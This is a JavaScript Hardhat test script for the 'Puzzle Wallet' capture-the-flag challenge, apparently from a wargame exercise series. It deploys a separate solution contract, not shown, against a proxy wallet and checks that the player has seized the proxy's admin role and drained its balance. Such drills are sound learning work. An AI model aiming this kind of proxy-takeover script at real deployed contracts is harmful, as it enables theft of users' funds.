const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0xFC4115B89a910366b8Cb0011a4D6aAC090BA4B71"

describe("24 Puzzle Wallet", function () {
    let player, solutionContract, challengeContract, proxyContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "PuzzleWallet",
            CONTRACT_ADDRESS,
            player
        )
        proxyContract = await ethers.getContractAt(
            "PuzzleProxy",
            CONTRACT_ADDRESS,
            player
        )
        solutionContract = await (
            await ethers.getContractFactory("PuzzleWalletSolution", player)
        ).deploy(CONTRACT_ADDRESS)
        const adminBefore = await proxyContract.admin()
        assert.notEqual(adminBefore.toString(), player.address.toString())
    })

    it("Execution", async function () {
        const targetBalance = await ethers.provider.getBalance(
            challengeContract.address
        )
        const txResponse = await solutionContract.solveChallenge({
            value: targetBalance,
            gasLimit: 5_000_000,
        })
        await txResponse.wait(1)
    })

    after(async function () {
        const adminAfter = await proxyContract.admin()
        assert.equal(adminAfter.toString(), player.address.toString())
    })
})
